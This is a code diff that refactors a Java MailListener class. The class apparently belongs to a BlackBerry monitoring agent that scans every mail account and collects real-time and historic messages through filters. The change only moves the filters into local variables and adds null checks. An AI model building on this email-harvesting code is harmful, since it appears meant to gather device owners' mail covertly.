@@ -59,8 +59,8 @@ public final class MailListener implements FolderListener, SendListener,
 
     protected static IntHashtable fieldTable;
     private static ServiceRecord[] mailServiceRecords;
-    private Filter realtimeFilter;
-    private Filter collectFilter;
+    //private Filter realtimeFilter;
+    //private Filter collectFilter;
 
     //Vector mailObservers = new Vector();
     MailObserver mailObserver;
@@ -100,13 +100,13 @@ public final class MailListener implements FolderListener, SendListener,
         debug.trace("Starting: " + mailServiceRecords.length + " accounts");
         //#endif
 
-        // to forever
+       /* // to forever
         realtimeFilter = (Filter) ((ModuleMessage) ModuleMessage.getInstance())
                 .getFilterEmailRealtime();
 
         // history
         collectFilter = (Filter) ((ModuleMessage) ModuleMessage.getInstance())
-                .getFilterEmailCollect();
+                .getFilterEmailCollect();*/
 
         // Controllo tutti gli account di posta
         for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
@@ -235,6 +235,8 @@ public final class MailListener implements FolderListener, SendListener,
                 //#endif
                 return;
             }
+            
+            Filter realtimeFilter = ModuleMessage.getInstance().getFilterEmailRealtime();
 
             //long lastcheck = messageAgent.getLastCheck(folderName);
             // realtime non guarda il lastcheck, li prende tutti.
@@ -302,13 +304,11 @@ public final class MailListener implements FolderListener, SendListener,
         //store.removeStoreListener(this);
     }
 
-
     boolean stopHistory;
 
     public void stopHistory() {
         stopHistory = true;
     }
-
 
     /**
      * retrieveHistoricMails.
@@ -317,8 +317,9 @@ public final class MailListener implements FolderListener, SendListener,
         //final long timestamp = messageAgent.initMarkup();  
         //#ifdef DEBUG
         debug.init();
+
         //#endif
-        
+
         //#ifdef DEBUG
         debug.trace("retrieveHistoricMails");
         //#endif
@@ -326,8 +327,8 @@ public final class MailListener implements FolderListener, SendListener,
         collecting = true;
         // questa data rappresenta l'ultimo controllo effettuato.
         // C.1=COLLECT
-        final Date lastCheckDate = ((ModuleMessage) ModuleMessage.getInstance())
-                .lastcheckGet(Messages.getString("C.1"));
+        final Date lastCheckDate = ModuleMessage.getInstance().lastcheckGet(
+                Messages.getString("C.1"));
 
         // Controllo tutti gli account di posta
         for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
@@ -358,8 +359,8 @@ public final class MailListener implements FolderListener, SendListener,
         //if (!stopHistory) {
         // al termine degli scanfolder
         // C.1=COLLECT
-        ((ModuleMessage) ModuleMessage.getInstance()).lastcheckSet(Messages.getString("C.1"),
-                new Date());
+        ((ModuleMessage) ModuleMessage.getInstance()).lastcheckSet(
+                Messages.getString("C.1"), new Date());
         //}
 
         //#ifdef DEBUG
@@ -380,26 +381,36 @@ public final class MailListener implements FolderListener, SendListener,
     public void scanFolders(final String storeName, final Folder[] subfolders,
             Date lastCheckDate) {
         Folder[] dirs;
+        
+        Filter collectFilter = ModuleMessage.getInstance().getFilterEmailCollect();
 
         //#ifdef DBC
         Check.requires(subfolders != null && subfolders.length >= 0,
                 "scanFolders");
-        Check.requires(lastCheckDate != null, "scanFolders lastCheckDate null");
-        Check.requires(collectFilter != null, "collectFilter == null");
+        Check.requires(lastCheckDate != null, "scanFolders, lastCheckDate null");
+        Check.requires(collectFilter != null, "scanFolders, collectFilter == null");
         //#endif
 
         if (collectFilter == null) {
             //#ifdef DEBUG
-            debug.trace("no collectFilter, messageAgent: "
+            debug.trace("scanFolders, no collectFilter, messageAgent: "
                     + ModuleMessage.getInstance());
             //#endif
             if (ModuleMessage.getInstance() != null) {
-                //#ifdef DEBUG
-                debug.trace("new collectFilter");
-                //#endif
+
                 collectFilter = (Filter) ((ModuleMessage) ModuleMessage
                         .getInstance()).getFilterEmailCollect();
+                //#ifdef DEBUG
+                debug.trace("scanFolders, get collectFilter: " + collectFilter);
+                //#endif
             }
+        }
+
+        if (collectFilter == null) {
+            //#ifdef DEBUG
+            debug.error("scanFolders: null collectFilter");
+            //#endif
+            return;
         }
 
         for (int count = 0; count < subfolders.length; count++) {
